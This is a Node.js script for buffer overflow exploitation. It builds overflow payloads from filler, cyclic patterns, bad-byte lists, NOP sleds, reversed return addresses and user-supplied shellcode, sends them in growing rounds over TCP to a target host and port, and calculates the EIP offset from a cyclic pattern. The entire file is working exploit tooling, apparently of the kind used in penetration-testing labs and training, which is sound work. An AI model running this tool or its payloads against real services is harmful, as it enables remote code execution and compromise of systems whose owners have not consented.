#!/usr/bin/env node
import { Socket } from 'net';
import { promisify } from 'util';
import { basename } from 'path';

const flags = [
    [['host','h'], 'str', null, 'hostname'],
    [['port','p'], 'int', null, 'port'],
    [['pre'], 'str', '', 'cmd prefix'],
    [['suf'], 'str', '', 'cmd suffix'],
    [['end'], 'str', '', 'line ending (ie. "\\r\\n")'],
    [['length','l'], 'int', 0, 'overflow length to begin with'],
    [['inc','i'], 'int', 0, 'increment overflow by this each round'],
    [['sleep'], 'int', 1000, 'time to wait between rounds, in milliseconds'],
    [['pattern','P'], 'str', null, 'one of: a|ab|nr|bad|shellcode|nop\nwhere:\n  a = AAAA...\n  b = AAAA...BBBB\n  nr = Aa0Aa1...\n  bad = \\x00\\x01\\x02...\n  shellcode = bytes provided on cli\n  nop = 909090...'],
    [['filter','f'], 'str', '', 'list bytes, as one string, to filter from bad byte sequence'],
    [['calc'], 'str', null, 'position in pattern to calculate length based on'],
    [['python'], 'bool', false, 'output to stdout in python format'],
    [['count','c'], 'int', 1, 'number of times to loop before exiting. -1=infinity'],
    [['ret','r'], 'str', null, 'return address (will be reversed for little-endian)'],
    [['shellcode'], 'str', '', 'shellcode in hexadecimal'],
    [['nopsled','n'], 'int', 0, 'length of nopsled in bytes'],
    [['nopprefix'], 'int', 0, 'NOPs before payload'],
    [['nopsuffix'], 'int', 0, 'more bytes appended to very end'],
];
const args = {};
const RX_FLAG = /^(?:--|-|\/)(\w+)$/;
for (let i=0,len=process.argv.length; i<len; i++) {
    let m, arg, n;
    if (null != (m = process.argv[i].trim().match(RX_FLAG))) { arg = m[1]; }
    if ('help' === arg || 'h' === arg || process.argv.length <= 2) {
        console.log(`Usage: ${basename(process.argv[0])} ${basename(process.argv[1])} [options]\n\nOptions:`);
        for (const [[long,short],,def,description] of flags) {
            console.log(`  ${(('--'+long+(null==short?'':', -'+short))+'                 ').substr(0,15)} ${description.replace(/\n/g, '\n                    ')}`+ ((null==def||''==def) ? '' : `\n                    (default: ${JSON.stringify(def)})`));
        }
        process.exit(0);
    }
    for (const [[long, short], type] of flags) {
        if (!(null != arg && (arg == long || arg == short))) { continue; }
        args[long] =
            'str' === type ? process.argv[++i] :
            'int' === type ? ((n=parseInt(process.argv[++i], 10)),(isNaN(n)? (def ?? 0) : n)) :
            'bool' === type ? true :
            null;
    }
}
for (const [[long],,def] of flags) {
    if (!args.hasOwnProperty(long)) {
        args[long] = def;
    }
}

// a non-repeating pattern, like a UV colormap in shader debug.
export const nr_pattern = (_l) => {
    let l;
    if (_l < 1) return '';
    else if (_l < 3) l = 3;
    else  l = Math.ceil(_l/3)*3;
    var o={},s='',g=(...a)=>{var n,x,b=i=>!i||i<n||i>x?n:i,i=a.length,d=1,t='',c;while(i>0){n=a[i-2];x=a[i-1];c=o[i]=b(o[i]);if(d)d=x===o[i]++;t=String.fromCharCode(c)+t;i-=2;}
    return t};while(l-->0)s+=g(65,90,97,122,48,57);
    return s.substr(0,_l); // => "Aa0Aa1Aa2Aa3Aa4Aa5A..."
};

// type discovered EIP hex value into `q` value.
export const nr_pattern_offset = (l=10000,q) => {
    var pattern = nr_pattern(l);
    // var q = '386F4337';
    var ascii=q.match(/.{1,2}/g).reduce((a,c)=>a+String.fromCharCode(parseInt(c, 16)),'').split('').reverse().join('');
    var offset=pattern.indexOf(ascii);
    return offset; // => 2003
};

// list all bytes \x00-\xFF skipping bad bytes
export const bad_bytes = (l, filter) => {
    const buf = [];
    let i = 0;
    while (buf.length<l) {
        const c = i % 256;
        if (-1 === filter.indexOf(c)) {
            buf.push(c);
        }
        i++;
    }
    return Buffer.from(buf); // => \x00\x01\x02\x03\x04...
};

const hexify = (b) => b.toString('hex');
const repeat = (s,l) => Buffer.concat(Array(l).fill(s));
const die = (s) => { console.error(s); process.exit(1); }
const NOP = Buffer.from('90', 'hex');

const main = async () => {
    const cmd_prefix = JSON.parse(`"${args.pre}"`);
    const cmd_suffix = JSON.parse(`"${args.suf}"`);
    const filter = Buffer.from(args.filter.replace(/\\x/g, ''), 'hex');
    const ret = null == args.ret ? null : Buffer.from(args.ret, 'hex').reverse();
    const shellcode = null == args.shellcode ? null : Buffer.from(args.shellcode, 'hex');

    let count = args.count;
    let length = args.length;
    while(count--!=0) {
        let socket;
        if (args.host || args.port) {
            socket = new Socket();
            if (null == args.host) { die('please specify host.'); }
            if (null == args.port) { die('please specify port.'); }
            await promisify(socket.connect.bind(socket))(args.port, args.host);
            console.log(`connected to ${args.host}:${args.port}. sending...`);
        }
        if (null != args.calc) { // exact-length filler
            length = nr_pattern_offset(args.inc > 10000 ? args.inc : 10000, args.calc);
            process.stderr.write(`offset at ${args.calc} is ${length} bytes.\n`);
        }
        if (null == args.pattern) { die('please specify pattern.'); }
        let filler = Buffer.alloc(0);
        if ('a' === args.pattern || 'ab' === args.pattern || 'shellcode' === args.pattern || 'nop' === args.pattern) {
            filler = repeat(Buffer.from('A'),length);
            if ('ab' === args.pattern) {
                filler = Buffer.concat([filler, ret ?? repeat(Buffer.from('B'),4)]);
            }
            else if ('shellcode' === args.pattern) {
                if (null == shellcode) { die('please specify shellcode.'); }
                filler = Buffer.concat([filler, ret]);
                if (args.nopsled > 0) {
                    const nops = repeat(NOP, args.nopsled);
                    filler = Buffer.concat([filler, nops]);
                }
                filler = Buffer.concat([filler, shellcode]);
            }
            else if ('nop' === args.pattern) {
                filler = repeat(NOP,length);
            }
        }
        else if ('nr' === args.pattern) {
            filler = Buffer.from(nr_pattern(length), 'ascii');
        }
        else if ('bad' === args.pattern) {
            filler = bad_bytes(length, filter);
        }
        const input = Buffer.concat([
            Buffer.from(cmd_prefix),
            filler,
            Buffer.from(repeat(NOP, args.nopprefix)),
            Buffer.from(cmd_suffix),
            Buffer.from(args.end),
            Buffer.from(repeat(NOP, args.nopsuffix)),
        ]);
        if (args.host || args.port) {
            let a = hexify(filler.slice(0,6));
            let b = hexify(filler.slice(-6));
            console.log(`${cmd_prefix}${a}...${b}:${filler.length}${args.end}`);
            socket.end(input, 'binary');
        }
        else {
            if (args.python) {
                for (let i=0,len=input.length; i<len; i++) {
                    if (0===i%13) { process.stdout.write('\n'); }
                    process.stdout.write(`\\x${('00'+input[i].toString(16)).substr(-2)}`);
                }
            }
            else {
                process.stdout.write(input);
            }
        }
        if (null != args.calc || args.inc < 1) { break; }
        if (null == args.calc) { // ever-increasing length
            length += parseInt(args.inc, 10);
        }
        await new Promise(ok=>setTimeout(ok,parseInt(args.sleep,10)));
    }
};

main();